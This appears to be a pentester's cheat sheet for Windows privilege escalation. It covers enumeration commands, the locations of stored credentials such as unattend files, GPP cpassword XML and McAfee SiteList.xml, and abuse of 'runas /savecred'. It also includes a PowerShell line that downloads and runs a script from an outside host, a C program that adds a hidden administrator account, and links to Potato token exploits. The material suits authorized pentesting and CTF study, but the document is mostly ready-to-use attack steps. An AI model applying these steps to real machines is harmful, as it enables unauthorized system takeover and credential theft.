# Win_Priv_Esc_Method
Windows Privilege Escalation Methodology

# Categories
* Stored Credentials
* Windows Kernel Exploit
* Applications/Drivers Exploits
* DLL Injection
* Unattended Answer File
* Insecure File/Folder Permissions
* Insecure Service Permissions
* DLL Hijacking
* Group Policy Preferences
* Unquoted Service Path
* Always Install Elevated
* Token Manipulation
* Insecure Registry Permissions
* Autologon User Credential
* User Account Control (UAC) Bypass
* Insecure Named Pipes Permissions

## General
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

* whoami
* whoami /priv
  * SeDebugPrivilege
  * SeRestorePrivilege
  * SeBackupPrivilege
  * SeTakeOwnershipPrivilege
  * SeTcbPrivilege
  * SeCreateToken Privilege
  * SeLoadDriver Privilege
  * SeImpersonate & SeAssignPrimaryToken Priv.

* whoami /groups

* net user
* net user <user>

* netstat -ano
* ipconfig /all
* route print

* tasklist /SVC > tasks.txt
* schtasks /query /fo LIST /v > schedule.txt

* netsh advfirewall show currentprofile
* netsh advfirewall firewall show rule name=all


* wmic product get name, version, vendor > apps_versions.txt
* DRIVERQUERY
* mountvol

* accesschk-2008-vista.exe /accepteula
* accesschk-2008-vista.exe -uws "Everyone" "C:\Program Files"

* reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
* reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

## Stored Crendentials
* net user
* net user <user>
* cmdkey /list
  -> if interactive module enabled 100% runas as other user
  -> if domain and user exist try again runas as other user

  * runas /savecred /user:<Domain>\<user> C:\<path>\<exefile>

* Stored as plaintext or base64
  * C:\unattend.xml
  * C:\Windows\Panther\Unattend.xml
  * C:\Windows\Panther\Unattend\Unattend.xml
  * C:\Windows\system32\sysprep.inf
  * C:\Windows\system32\sysprep\sysprep.xml
  
* If system is running an IIS web server the web.config file:
  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
  * C:\inetpub\wwwroot\web.config

* Local administrators passwords can also retrieved via the Group Policy Preferences:
  * C:\ProgramData\Microsoft\Group Policy\History????\Machine\Preferences\Groups\Groups.xml
  * \????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml

* Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:
  * Services\Services.xml
  * ScheduledTasks\ScheduledTasks.xml
  * Printers\Printers.xml
  * Drives\Drives.xml
  * DataSources\DataSources.xml

* Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
  * %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml

## Windows Kernel Exploits
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
  * searchsploit 
  * google

* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

* Windows-Exploit-Suggester
  * python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo grandpa.txt

* Serlock
  * Config: Add to the last line the "Find-AllVulns"
  * Download and run Sherlock:
     * echo IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/Sherlock.ps1') | powershell -noprofile -

* Watson
  * Find .NET latest version of victim:
     * dir %windir%\Microsoft.NET\Framework /AD     
   * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
   * Build exe to visual studio

## Applications/Drivers Exploits
* wmic product get name, version, vendor > install_apps.txt
  * searchsploit
  * google

* driverquery /v > drivers.txt
* powershell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'
* powershell and specific word: Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  * searchsploit
  * google
  

## Insecure File/Folder Permissions
* use: https://download.sysinternals.com/files/AccessChk.zip
* Search for world writable files and directories:
  * accesschk.exe -uws "Everyone" "C:\Progrma Files"
  * powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
  
* Or find running proccess:
  * tasklist /SVC > tasks.txt
  * powershell:  Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}
  
-> Focus on Program Files or compare with a Defaults of your system.

* icacls "<path>\<file>.exe"
'''
#include <stdlib.h>
int main ()
{
 int i;

 i = system ("net user evil Ev!lpass /add");
 i = system ("net localgroup administrators evil /add");
return 0;
}
'''

## Token Manipulation
* whoami /priv
* More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
  * SeDebugPrivilege
  * SeRestorePrivilege
  * SeBackupPrivilege
  * SeTakeOwnershipPrivilege
  * SeTcbPrivilege
  * SeCreateToken Privilege
  * SeLoadDriver Privilege
  * SeImpersonate & SeAssignPrimaryToken Priv.

### Potatos
#### Hot Potato
* What is: Hot Potato (aka: Potato) takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.
* Affected systems: Windows 7,8,10, Server 2008, Server 2012
* Guide: https://foxglovesecurity.com/2016/01/16/hot-potato/
* Use: https://github.com/foxglovesec/Potato

#### Rotten Potato
* What is: Rotten Potato and its standalone variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges
* Affetced sytsems: Windows 7,8,10, Server 2008, Server 2012, Server 2016
* Guide: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ https://0xdf.gitlab.io/2018/08/04/htb-silo.html
* Use: https://github.com/nickvourd/lonelypotato
* Rotten Potato from default opens meterpreter, use lonely potato which opens in line shell

#### Juicy Potato
* What is: Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation.

* Affetcted Systems:

  * Windows 7 Enterprise
  * Windows 8.1 Enterprise
  * Windows 10 Enterprise
  * Windows 10 Professional
  * Windows Server 2008 R2 Enterprise
  * Windows Server 2012 Datacenter
  * Windows Server 2016 Standard

* Find CLSID here: https://ohpe.it/juicy-potato/CLSID/
* Warning: Juicy Potato doesn’t work in Windows Server 2019
* Guides:
1) https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges 
2) https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.
* Use: https://github.com/ohpe/juicy-potato

